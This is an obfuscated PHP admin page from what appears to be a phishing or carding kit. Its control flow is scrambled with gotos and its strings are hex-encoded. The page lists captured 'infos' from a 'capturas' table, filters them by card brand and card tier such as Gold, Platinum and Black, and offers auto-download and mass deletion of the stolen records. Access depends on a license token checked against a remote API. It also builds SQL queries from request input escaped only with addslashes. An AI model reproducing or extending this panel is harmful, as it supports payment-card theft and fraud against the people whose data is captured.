<?php

 goto dzteg;
 lwbqP: require_once "\x66\165\x6e\x63\x74\151\x6f\x6e\x2f\143\x6f\x6e\x65\x78\141\157\56\160\150\x70";
 goto gHI2k;
 gHI2k: require_once "\146\x75\156\x63\x74\x69\x6f\156\57\143\x6f\x6e\x66\x69\147\x2e\160\x68\x70";
 goto COdTT;
 wmldS: if (isset($_SESSION["\x6c\x6f\x67\151\156\x5f\x75\x73\x65\162"]) and $a == 1) { $ID_FILTRADO = filter_var($_GET["\x69\144"], FILTER_SANITIZE_NUMBER_INT);

 $ID = addslashes($ID_FILTRADO);
 $dadosLTS = "\x53\x45\114\x45\103\124\x2a\x20\x46\x52\x4f\115\x20\x63\141\160\x74\x75\x72\x61\x73\40";

 $conLTS = $mysqli->query($dadosLTS) or die($mysqli->error);
 $consultaBsB = "\x53\x45\x4c\105\103\124\52\x20\x46\x52\x4f\x4d\x20\160\x72\x6f\144\165\x74\157\x73\x20\x77\x68\145\162\145\x20\151\144\75\x27{$ID}\47";
 $conB = $mysqli->query($consultaBsB) or die($mysqli->error);
 while ($consultaB = $conB->fetch_array()) { $img = $consultaB["\x69\155\x67"];
 $nome_a = $consultaB["\x6e\157\x6d\x65\x5f\160\x72\157\x64\x75\x74\157"];

 } $nome = substr($nome_a, 0, 25);
 if ($dias < 1 and $hora < 1 and $minuto < 1 and $segundos < 1) { $tempo_restante = "\123\x75\141\40\x74\x65\x6c\141\40\x65\170\x70\151\x72\x6f\165\x20";
 } else { $tempo_restante = "{$dias}\40\144\151\x61\x73\40{$hora}\x20\x68\x6f\x72\141\163\x20{$minuto}\x20\155\x69\156\x75\x74\x6f\x73\40\145\40{$segundos}\x20\x73\x65\147\165\x6e\144\157\x73";
 } if (isset($_POST["\x74\x6b\137\160\x65\162\155\x69\x73\163\x61\157"])) { $tk_new = addslashes($_POST["\164\153\137\156\145\x77"]);
 $urlW = "\x68\x74\x74\160\72\57\57{$host_api}\x2f\x61\160\151\57\x6c\x69\x6e\153\137\141\x2e\160\x68\160\77\x74\153\x3d{$tokken}\x26\x73\154\157\x74\x3d{$slot}";
 $optionsW = array("\150\164\164\x70" => array("\155\x65\164\x68\157\144" => "\107\105\124", "\x68\145\141\x64\145\x72" => "\x41\x63\x63\x65\x70\164\55\154\x61\156\x67\x75\141\147\145\x3a\x20\145\x6e\15\12" . "\103\x6f\x6f\153\x69\x65\72\40\x66\x6f\x6f\75\x62\141\x72\xd\xa" . "\125\163\x65\x72\x2d\x41\147\x65\156\x74\72\40\115\x6f\x7a\151\154\x6c\141\57\x35\56\60\40\50\x69\x50\141\144\73\x20\x55\x3b\x20\103\x50\125\40\x4f\x53\40\x33\x5f\x32\40\x6c\151\x6b\x65\x20\x4d\141\143\40\x4f\123\x20\x58\73\40\145\x6e\55\x75\163\51\x20\101\160\160\x6c\x65\x57\145\x62\113\x69\x74\x2f\65\63\61\x2e\62\61\56\61\x30\x20\50\x4b\x48\x54\x4d\114\x2c\x20\x6c\x69\153\x65\x20\x47\x65\143\x6b\157\51\40\x56\145\162\x73\151\x6f\x6e\x2f\64\56\60\56\x34\x20\x4d\157\142\151\154\x65\x2f\67\102\63\x33\x34\x62\x20\123\141\x66\141\162\151\57\65\63\61\x2e\62\61\x2e\61\x30\62\x30\61\61\55\x31\x30\x2d\61\x36\40\x32\60\x3a\62\x33\x3a\x31\x30\xd\xa"));
 $context = stream_context_create($optionsW);
 $storeW = file_get_contents($urlW, false, $context);
 $varQ = explode("\x27\154\47\40\75\40\161\167\x65\162", $storeW);
 $xee = explode("\x2e", $varQ[1]);
 if ($tk_new == $xee[0]) { $_SESSION["\x70\x65\x72\x6d\x69\x73\x73\x61\157"] = "\x6f\153";
 } else { $msg = "\74\x66\x6f\156\164\40\x63\157\154\x6f\x72\x3d\47\162\x65\x64\x27\76\40\103\x68\141\166\x65\x20\x69\x6e\166\303\241\154\x69\x64\x61\x20\x3c\x2f\146\x6f\x6e\164\x3e\40";
 } } if (isset($_POST["\x61\x74\165\x61\154\151\172\x61\162\x5f\164\145\155\160\x6f"])) { $TEMPO_FILTRADO = filter_var($_POST["\164\145\155\x70\157\x5f\x72\x65\146\162\x65\163\x68"], FILTER_SANITIZE_NUMBER_INT);
 if ($TEMPO_FILTRADO < 60) { header("\x6c\x6f\x63\x61\164\151\157\156\x3a\40\x69\156\146\157\x73\56\x70\x68\160\77\x6d\163\147\x54\145\x6d\x70\157");
 } else { $_SESSION["\x74\145\155\160\x6f\137\x72\x65\x66\x72\145\163\x68"] = $TEMPO_FILTRADO;
 } } if (empty($_SESSION["\x74\x65\x6d\x70\157\x5f\x72\145\x66\162\x65\x73\150"])) { $_SESSION["\164\x65\155\x70\x6f\x5f\x72\x65\x66\162\x65\x73\x68"] = 60;
 } $contagem_1 = $_SESSION["\164\x65\155\x70\x6f\x5f\x72\x65\x66\162\x65\163\x68"] * 1000;
 if (isset($_GET["\142\x61\x6e\144\x65\x69\x72\x61"])) { $BANDEIRA_SELECT = addslashes($_GET["\x62\x61\x6e\144\x65\151\x72\x61"]);
 } else { $BANDEIRA_SELECT = "\x61\x6c\x6c";
 } if (isset($_GET["\154\145\166\145\x6c"])) { $LEVEL_SELECT = addslashes($_GET["\154\x65\166\145\x6c"]);
 } else { $LEVEL_SELECT = "\x61\x6c\154";
 } if (isset($_GET["\x7a\145\x72\141\162"])) { $sql = "\x54\122\125\x4e\x43\101\124\105\40\x54\x41\102\114\105\x20\143\x61\x70\x74\x75\162\x61\163\x3b";
 $query = $mysqli->query($sql);
 header("\154\x6f\143\141\164\x69\157\156\72\x20\x69\x6e\146\157\163\x2e\x70\x68\160");
 } if (empty($_SESSION["\x64\x6f\156\167\x6c\x6f\141\x64"])) { $_SESSION["\144\157\x6e\167\154\157\x61\x64"] = "\x6e\157";
 } if (isset($_GET["\141\164\151\166\141\x72"])) { $_SESSION["\144\x6f\156\x77\154\157\141\144"] = "\x79\145\163";
 header("\154\157\x63\141\164\x69\157\156\72\40\151\156\146\x6f\163\56\x70\150\x70");
 } else { if (isset($_GET["\x64\145\163\x61\164\151\x76\141\162"])) { $_SESSION["\144\x6f\x6e\167\x6c\x6f\141\x64"] = "\156\157";
 header("\154\157\143\141\x74\151\157\156\72\x20\x69\x6e\x66\157\x73\56\x70\x68\160");
 } } if (isset($_GET["\x64\145\x6c\145\x74\145"])) { $ID_DELETE = filter_var($_GET["\144\145\x6c\x65\164\145"], FILTER_SANITIZE_NUMBER_INT);
 $sql = "\104\x45\x4c\105\124\x45\40\x46\x52\x4f\115\40\x63\x61\160\x74\165\x72\141\x73\x20\127\110\105\x52\x45\40\151\x64\40\x3d\x20{$ID_DELETE}";
 $query = $mysqli->query($sql);
 header("\x6c\x6f\x63\141\164\x69\x6f\156\72\40\x69\156\146\x6f\163\x2e\160\150\x70");
 } ?>
<!doctypehtml><html lang="en"><head><meta charset="utf-8"><meta content="IE=edge"http-equiv="X-UA-Compatible"><meta content="width=device-width,initial-scale=1"name="viewport"><title><?php  echo $name_tela;
 ?>
- ZK</title><link href="assets/css/fonts/fontawesome/all.min.css"rel="stylesheet"><link href="assets/css/fonts/beid.css"rel="stylesheet"><link href="assets/css/main.css"rel="stylesheet"><link href="assets/css/styles.css"rel="stylesheet"><link href="assets/plugins/jqvmap/jqvmap.min.css"rel="stylesheet"><link href="assets/plugins/daterangepicker/daterangepicker.css"rel="stylesheet"><link href="assets/img/apple-touch-icon.png"rel="apple-touch-icon"><link href="assets/img/favicon.png"rel="icon"><link href="assets/fonts/inter/inter.css"rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i"rel="stylesheet"><link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"rel="stylesheet"><!--[if lt IE 9]><script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script><script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]--></head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script type="text/javascript">$(document).ready(function(){comeca()});
var timerI=null,timerR=!1;
function para(){timerR&&clearTimeout(timerI),timerR=!1}function comeca(){para(),lista()}function lista(){$.ajax({url:"teste.php?bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
&level=<?php  echo $LEVEL_SELECT;
 ?>
",success:function(t){$("#lista").html(t)}}),timerI=setTimeout("lista()",<?php  echo $contagem_1;
 ?>
),timerR=!0}</script><script type="text/javascript">var count=new Number;
count=<?php  echo $_SESSION["\x74\x65\x6d\x70\157\137\162\x65\x66\162\145\x73\150"];
 ?>
;
function start(){0<=count-1&&(0==(count-=1)?count=<?php  echo $_SESSION["\x74\x65\155\160\x6f\x5f\162\145\x66\x72\x65\x73\x68"];
 ?>
:count<<?php  echo $_SESSION["\164\x65\155\160\x6f\x5f\x72\x65\146\162\x65\163\x68"];
 ?>
&&(count=+count),tempo.innerText=count,setTimeout("start();
",1e3))}</script><body class="body"onload="start()"><?php  if ($status_tokken[0] == 1 and $_SESSION["\x70\145\162\155\x69\163\163\x61\157"] == "\157\x6b") { ?>
<main><center><br><img src="assets/img/logo_pequena.png"width="120"><br><a href="index.php"><span class="btn btn-sm fw-600 pl-0"><i class="fas fa-arrow-left mr-1"></i>Voltar</span></a></center><br><script>$(document).ready(function(){$("#link").on("change",function(){var n=$(this).val();
return n&&window.open(n,"_self"),!1})}),$(document).ready(function(){$("#link2").on("change",function(){var n=$(this).val();
return n&&window.open(n,"_self"),!1})})</script><script>function delete_all(){var e=document.getElementById("all1"),l=document.getElementById("all2");
e.style.display="none",l.style.display=""}function no_delete(){var e=document.getElementById("all1"),l=document.getElementById("all2");
e.style.display="",l.style.display="none"}</script><div class="panel"><div class="pl-4 pl-md-7"><a href="all.php"class="btn parallelogram btn-primary"><span class="d-block">ver tudo</span></a> <a class="btn parallelogram btn-danger"id="all1"onclick="delete_all()"style=""><span class="d-block">Deletar tudo ( Não há como recuperar )</span></a><br><br><p id="all2"style="display:none">Tem certeza que deseja deletar todas infos? (<a href="infos.php?zerar"><font color="green">SIM</font> </a>) (<a href="#"onclick="no_delete()"><font color="red">NÃO</font> </a>)</p></div><br><form action="infos.php"method="post"><div class="col-md-3 mx-auto"><div class="input-group"><div class="input-group-prepend"><span class="input-group-text"><i class="fas fa-clock"></i></span></div><input name="tempo_refresh"class="form-control"placeholder="Tempo de atualização"type="tel"value="<?php  echo $_SESSION["\164\145\x6d\x70\x6f\x5f\x72\x65\x66\162\145\x73\150"];
 ?>
"><div class="input-group-append ml-3"><button class="btn btn-theme"name="atualizar_tempo"type="submit">Atualizar</button></div></div><?php  if (isset($_GET["\x6d\163\x67\x54\x65\x6d\160\x6f"])) { ?>
<font color="red">Tempo não pode ser menor que 60 segundos </font><?php  } ?>
</div><br><center>Bandeira</center><div class="col-md-3 mx-auto"><div class="form-group"><select class="form-control"id="link"><?php  if ($BANDEIRA_SELECT == "\x61\154\x6c") { ?>
<option value="infos.php?bandeira=all&level=<?php  echo $LEVEL_SELECT;
 ?>
">Todas</option><?php  } else { ?>
<option value="infos.php?bandeira=all&level=<?php  echo $LEVEL_SELECT;
 ?>
">Todas</option><?php  } ?>
<option value="infos.php?bandeira=mastercard&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\x6d\x61\163\164\145\162\143\x61\x72\x64") { } ?>
>Mastercard</option><option value="infos.php?bandeira=visa&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\x76\x69\x73\x61") { } ?>
>Visa</option><option value="infos.php?bandeira=american express company&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\141\155\x65\162\x69\143\x61\x6e\40\x65\x78\x70\x72\145\x73\x73\40\x63\x6f\155\160\141\156\x79") { } ?>
>Amex</option><option value="infos.php?bandeira=discover&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\x64\x69\x73\x63\157\x76\x65\162") { } ?>
>Discover</option><option value="infos.php?bandeira=elo&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\145\x6c\x6f") { } ?>
>Elo</option><option value="infos.php?bandeira=hipercard&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\150\151\x70\x65\x72\x63\x61\x72\x64") { } ?>
>Hipercard</option><option value="infos.php?bandeira=ebt&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\x65\142\x74") { } ?>
>Maestro</option><option value="infos.php?bandeira=jcb&level=<?php  echo $LEVEL_SELECT;
 ?>
"selected<?php  if ($BANDEIRA_SELECT == "\152\x63\142") { } ?>
>JCB</option></select></div><center>Level</center><div class="form-group"><select class="form-control"id="link2"><?php  if ($LEVEL_SELECT == "\x61\154\154") { ?>
<option value="infos.php?level=all&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
">Todas</option><?php  } else { ?>
<option value="infos.php?level=all&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
">Todas</option><?php  } ?>
<option value="infos.php?level=classic&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\143\154\x61\163\163\151\x63") { } ?>
>Classic</option><option value="infos.php?level=standard&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\163\x74\x61\x6e\144\141\x72\144") { } ?>
>Standard</option><option value="infos.php?level=business&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\x62\165\x73\151\x6e\x65\163\163") { } ?>
>Business</option><option value="infos.php?level=electronic&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\145\x6c\x65\x63\x74\x72\157\156\151\143") { } ?>
>Electronic</option><option value="infos.php?level=gold&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\x67\x6f\x6c\144") { } ?>
>Gold</option><option value="infos.php?level=platinum&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\160\154\x61\164\151\x6e\165\155") { } ?>
>Platinum</option><option value="infos.php?level=black&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\x62\154\x61\143\153") { } ?>
>Black</option><option value="infos.php?level=infinite&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\x69\x6e\x66\151\x6e\x69\x74\145") { } ?>
>Infinite</option><option value="infos.php?level=personal&bandeira=<?php  echo $BANDEIRA_SELECT;
 ?>
"selected<?php  if ($LEVEL_SELECT == "\160\x65\x72\x73\x6f\156\x61\x6c") { } ?>
>Personal</option></select></div></div></form><br><center><?php  if ($_SESSION["\144\157\x6e\167\154\x6f\x61\144"] == "\x6e\x6f") { ?>
<a href="infos.php?ativar"class="btn parallelogram btn-success"><span class="d-block">Ativar Download Automático</span></a><?php  } else { ?>
<a href="infos.php?desativar"class="btn parallelogram btn-danger"><span class="d-block">Desativar Download Automático</span></a><?php  } ?>
</center><div class="align-items-center panel-header"><div><h5 class="mb-0 title">Exibindo as últimas 100 infos</h5>Atualizando em: <span id="tempo"></span></div><div class="ml-auto panel-header-nav"><a href="#collapseRecentOrders"class="mr-3 nav-item"aria-controls="collapseRecentOrders"aria-expanded="false"data-toggle="collapse"role="button"><span class="icon-minus"></span></a></div></div><div id="lista"></div></div><?php  } else { if ($_SESSION != "\x6f\x6b") { ?>
<center><div class="col-md-7"><div class="pl-md-0 pr-md-7 px-4 py-6"><h6 class="lh-1 mb-4 text-light">

Acesso restrito</h6><small><p><strong>Para acessar essa área é necessário sua chave</strong></p></small><font color="red"><?php  if (empty($msg)) { } else { echo $msg;
 } ?>
</font><div><form action="infos.php?acao=<?php  echo $_GET["\141\143\x61\x6f"]; 
?>
"method="post"class="input-light"><div class="input-group mb-5"><div class="input-group-prepend"></div><input name="tk_new"class="form-control"placeholder="Chave" type="hidden" rows="10"></div><input name="id"type="hidden"value="<?php  echo $ID;
 ?>
"><div class="form-group mt-6"><button class="btn btn-block btn-warning"name="tk_permissao"type="submit">Acessar</button></div><div class="d-flex"><div><a href="index.php"><span class="btn btn-sm fw-600 pl-0"><i class="fas fa-arrow-left mr-1"></i>Voltar</span></a></div><div class="ml-auto"></div></div></form></div></div></div></center><?php  } else { header("\x4c\157\143\141\x74\x69\157\x6e\72\40\154\x6f\147\x69\x6e\x2e\x70\150\160\x3f\164\x6f\x6b\x6b\145\x6e\111\156\x76\x61\154\x69\144");
 } ?>
</main><?php  } ?>
<script src="assets/js/jquery.min.js"></script><script src="assets/js/bootstrap.min.js"></script><script src="assets/js/scripts.js"></script><script src="assets/js/main.js"data-plugins="load"id="_mainJS"></script></body></html><?php  } else { ?>
Esta uma rea restrita, por favor, <a href="login.php"><strong>efetue login</strong></a>.<?php  } goto anTES;
 ZUaeh: ini_set(display_errors, 0);
 goto z52Wa;
 wrmfW: $dadosVX = "\123\x45\x4c\105\103\124\52\40\106\122\x4f\115\40\x63\x6f\156\x66\151\147\x75\162\141\143\x61\x6f\x20\x77\150\145\x72\x65\x20\x69\x64\x3d\x31";

goto RYH2t;
 z52Wa: session_start();
 goto lwbqP;
 RYH2t: $conVX = $mysqli->query($dadosVX) or die($mysqli->error);
 goto SS_GX;
 COdTT: require_once "\146\x75\156\143\164\x69\x6f\x6e\x2f\x6e\x65\167\137\x66\x75\x6e\143\164\x69\157\156\56\160\150\160";
goto wrmfW;
 SS_GX: while ($consultaVX = $conVX->fetch_array()) { $tokken = $consultaVX["\x74\157\153\x6b\x65\x6e"];
 $slot = $consultaVX["\x73\154\x6f\164"];}

 goto mengw;
 anTES: ob_end_flush();
 goto GvTni;
 NngUV: if (empty($_SESSION["\150\157\x73\164\137\141\x70\x69"])) { } else { $url = "\150\x74\164\160\x3a\x2f\57{$host_api}\57\x61\160\151\x2f\x70\165\170\141\162\x2e\x70\x68\x70\x3f\x74\153\x3d{$tokken}\x26\x68\157\163\x74\75{$host}\46\x76\x65\x72\151\146\171\75\156\x6f";
 $options = array("\150\x74\x74\160" => array("\155\x65\164\x68\x6f\x64" => "\x47\105\x54", "\x68\x65\x61\144\x65\162" => "\101\143\x63\x65\160\x74\55\x6c\x61\x6e\147\x75\141\x67\x65\72\x20\145\156\xd\xa" . "\103\x6f\x6f\153\151\x65\72\40\146\157\157\x3d\142\141\x72\15\xa" . "\x55\163\x65\162\55\x41\147\145\156\164\72\x20\115\x6f\172\151\x6c\154\x61\x2f\65\x2e\60\40\x28\151\120\x61\x64\73\40\125\73\40\x43\x50\x55\40\x4f\123\40\63\137\x32\40\x6c\x69\x6b\x65\40\115\x61\x63\40\117\x53\x20\130\73\40\x65\x6e\x2d\165\x73\x29\40\101\x70\160\154\145\127\145\x62\113\x69\x74\57\x35\x33\x31\x2e\62\x31\56\x31\x30\40\50\x4b\110\124\x4d\x4c\54\40\154\151\x6b\x65\x20\107\145\143\153\x6f\x29\40\x56\x65\162\163\151\x6f\156\57\64\x2e\60\x2e\x34\40\115\157\x62\151\x6c\x65\x2f\67\x42\x33\x33\x34\142\40\123\x61\146\141\162\151\57\x35\x33\x31\56\x32\x31\56\x31\60\62\x30\61\61\x2d\x31\60\x2d\61\66\x20\62\60\x3a\x32\63\x3a\x31\x30\15\xa"));
 $context = stream_context_create($options);
 $store = file_get_contents($url, false, $context);
 $var1 = explode("\47\141\47\x20\x3d\76", $store);
 $status_tokken = explode("\74\142\x72\76", $var1[1]);
 $var2 = explode("\47\x62\x27\40\x3d\x3e", $store);
 $nome_tokken = explode("\x3c\x62\162\76", $var2[1]);
 $var3 = explode("\47\143\47\40\x3d\x3e", $store);
 $expira_tokken = explode("\74\142\162\76", $var3[1]);
 $a = 1;

}
 goto wmldS;
 mengw: $host_api = $_SESSION["\150\157\x73\164\137\141\160\x69"];

 goto NngUV;
 dzteg: error_reporting(0);
 goto ZUaeh;
 GvTni: ?>